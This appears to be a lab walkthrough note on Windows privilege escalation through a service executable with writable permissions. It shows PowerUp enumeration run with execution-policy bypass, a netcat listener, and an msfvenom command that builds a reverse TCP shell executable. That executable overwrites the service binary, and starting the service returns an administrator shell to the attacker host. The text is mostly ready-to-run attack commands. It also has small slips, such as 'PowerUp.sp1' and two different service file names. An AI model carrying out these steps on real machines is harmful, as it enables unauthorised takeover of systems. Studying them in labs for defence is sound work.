# <span style="color:lightblue">Executable Files</span>

## <span style="color:lightgreen">Methodology</span>
Microsoft Windows services, formerly known as NT services, enable you to create long-running executable applications that run in their own Windows sessions. These services can be automatically started when the computer boots, can be paused and restarted, and do not show any user interface.

Hence if we get Full Contol permission over the file path location, we can drop our malicious executable file to gain administrator access.

## <span style="color:lightgreen">Detection</span>

1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the service executable field)
```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```

![image](https://user-images.githubusercontent.com/59029171/161047964-59d53aa2-ebd2-4cb3-85e7-5e103e19c4e1.png)

We can see that we have Modifiable File access to `"c:\Program Files\File Permissions Service\filepermservice.exe"`. To gain administrator access, we can drop our malicious executable file on this location.

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o x.exe
```

3. Copy the generated file `x.exe`, to the Windows VM and replace it over  `filepermsvc.exe`.

### Windows VM

1. In command prompt type: 
```console
C:\Temp> sc start filepermsvc
```

### Kali VM

1. Wait for a reverse shell on your kali machine.

